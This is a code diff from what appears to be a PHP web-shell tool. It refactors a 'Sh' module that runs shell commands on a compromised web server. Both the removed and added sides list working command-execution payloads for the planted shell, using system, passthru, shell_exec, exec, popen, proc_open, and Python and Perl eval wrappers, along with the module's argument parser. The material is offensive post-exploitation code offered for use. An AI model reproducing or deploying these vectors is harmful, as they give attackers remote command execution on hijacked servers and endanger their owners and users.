@@ -16,26 +16,27 @@ WARN_SH_INTERPRETER_FAIL = 'Shell interpreters load failed'
 class Sh(ModuleProbeAll):
     '''Shell to execute system commands'''
 
-    vectors = VectorList([
-            Vector('shell.php', "system", "system('$cmd$stderr');"),
-            Vector('shell.php', "passthru" , "passthru('$cmd$stderr');"),
-            Vector('shell.php', "shell_exec", "echo shell_exec('$cmd$stderr');"),
-            Vector('shell.php', "exec", "exec('$cmd$stderr', $r); echo(join(\"\\n\",$r));"),
-#            Vector('shell.php', "pcntl", ' $p = pcntl_fork(); if(!$p) {{ pcntl_exec( "/bin/sh", Array("-c", "$cmd")); }} else {{ pcntl_waitpid($p,$status); }}'),
-            Vector('shell.php', "popen", "$h = popen('$cmd','r'); while(!feof($h)) echo(fread($h,4096)); pclose($h);"),
-            Vector('shell.php', "python_eval", "python_eval('import os; os.system('$cmd$stderr');"),
-            Vector('shell.php', "perl_system", "$perl = new perl(); $r = @perl->system('$cmd$stderr'); echo $r;"),
-            Vector('shell.php', "proc_open", """$p = array(array('pipe', 'r'), array('pipe', 'w'), array('pipe', 'w'));
-$h = proc_open('$cmd', $p, $pipes); while(!feof($pipes[1])) echo(fread($pipes[1],4096));
-while(!feof($pipes[2])) echo(fread($pipes[2],4096)); fclose($pipes[0]); fclose($pipes[1]);
-fclose($pipes[2]); proc_close($h);"""),
-            ])
-
-    argparser = ArgumentParser(usage=__doc__)
-    argparser.add_argument('cmd', help='Shell command', nargs='+' )
-    argparser.add_argument('-stderr', help='Print standard error output', action='store_const', const=False, default=True)
-    argparser.add_argument('-vector', choices = vectors.get_names())
-    argparser.add_argument('-just-probe', help=SUPPRESS, action='store_true')
+    def _init_vectors(self):
+        self.vectors = VectorList([
+                Vector('shell.php', "system", "system('$cmd$stderr');"),
+                Vector('shell.php', "passthru" , "passthru('$cmd$stderr');"),
+                Vector('shell.php', "shell_exec", "echo shell_exec('$cmd$stderr');"),
+                Vector('shell.php', "exec", "exec('$cmd$stderr', $r); echo(join(\"\\n\",$r));"),
+    #            Vector('shell.php', "pcntl", ' $p = pcntl_fork(); if(!$p) {{ pcntl_exec( "/bin/sh", Array("-c", "$cmd")); }} else {{ pcntl_waitpid($p,$status); }}'),
+                Vector('shell.php', "popen", "$h = popen('$cmd','r'); while(!feof($h)) echo(fread($h,4096)); pclose($h);"),
+                Vector('shell.php', "python_eval", "python_eval('import os; os.system('$cmd$stderr');"),
+                Vector('shell.php', "perl_system", "$perl = new perl(); $r = @perl->system('$cmd$stderr'); echo $r;"),
+                Vector('shell.php', "proc_open", """$p = array(array('pipe', 'r'), array('pipe', 'w'), array('pipe', 'w'));
+    $h = proc_open('$cmd', $p, $pipes); while(!feof($pipes[1])) echo(fread($pipes[1],4096));
+    while(!feof($pipes[2])) echo(fread($pipes[2],4096)); fclose($pipes[0]); fclose($pipes[1]);
+    fclose($pipes[2]); proc_close($h);"""),
+                ])
+    
+    def _init_args(self):
+        self.argparser.add_argument('cmd', help='Shell command', nargs='+' )
+        self.argparser.add_argument('-stderr', help='Print standard error output', action='store_const', const=False, default=True)
+        self.argparser.add_argument('-vector', choices = self.vectors.get_names())
+        self.argparser.add_argument('-just-probe', help=SUPPRESS, action='store_true')
     
     def _init_module(self):
         self.stored_args = { 'vector' : None }
